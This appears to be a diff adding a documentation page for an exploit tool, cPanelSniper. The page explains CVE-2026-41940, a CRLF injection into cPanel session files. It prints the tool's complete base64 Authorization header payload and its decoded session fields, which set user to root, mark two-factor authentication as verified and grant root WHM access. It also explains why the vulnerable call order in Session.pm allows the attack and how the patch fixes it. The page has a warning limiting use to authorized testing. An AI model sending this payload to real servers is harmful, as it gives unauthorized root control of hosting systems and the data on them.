@@ -1,0 +1,54 @@
+---
+title: "CRLF Injection Payload Structure for CVE-2026-41940"
+description: "Technical breakdown of the base64-encoded CRLF payload used in CVE-2026-41940, including decoded session fields and how they bypass cPanel auth."
+---
+
+CVE-2026-41940 exploits the fact that cPanel's `saveSession()` in `Session.pm` writes the `Authorization: Basic` header value verbatim into the session file before calling `filter_sessiondata()`. By encoding CRLF sequences into the base64 value, an attacker injects arbitrary key-value fields that cPanel's session reader treats as legitimate session data.
+
+<Warning>
+  This tool is for **authorized penetration testing and bug bounty programs only**. Using it against systems without explicit written permission is illegal.
+</Warning>
+
+## The payload
+
+cPanelSniper uses a fixed base64-encoded payload sent in the `Authorization: Basic` header:
+
+```
+cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5
+OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x
+```
+
+When base64-decoded, this produces:
+
+```
+root:x\r\n
+successful_internal_auth_with_timestamp=9999999999\r\n
+user=root\r\n
+tfa_verified=1\r\n
+hasroot=1
+```
+
+The `\r\n` sequences become literal newlines in the session file, causing cPanel's parser to interpret each line as a separate session field.
+
+## Injected session fields
+
+| Field | Value | Purpose |
+|-------|-------|---------|
+| `successful_internal_auth_with_timestamp` | `9999999999` | Marks the session as internally authenticated with a far-future timestamp |
+| `user` | `root` | Sets the authenticated username to root |
+| `tfa_verified` | `1` | Bypasses two-factor authentication check |
+| `hasroot` | `1` | Grants root-level WHM access |
+
+## Why the timing matters
+
+The root cause is the call order in `Session.pm`:
+
+```
+Vulnerable flow:
+  POST /login/ → write session file (CRLF payload included) → filter_sessiondata() → auth check reads poisoned file
+
+Patched flow:
+  POST /login/ → filter_sessiondata() → write session file (CRLF stripped) → auth check reads clean file
+```
+
+In the patched versions (see [Affected Versions](/vulnerability/affected-versions)), `filter_sessiondata()` is called before the session is written to disk, so CRLF characters are stripped before they can poison the file.
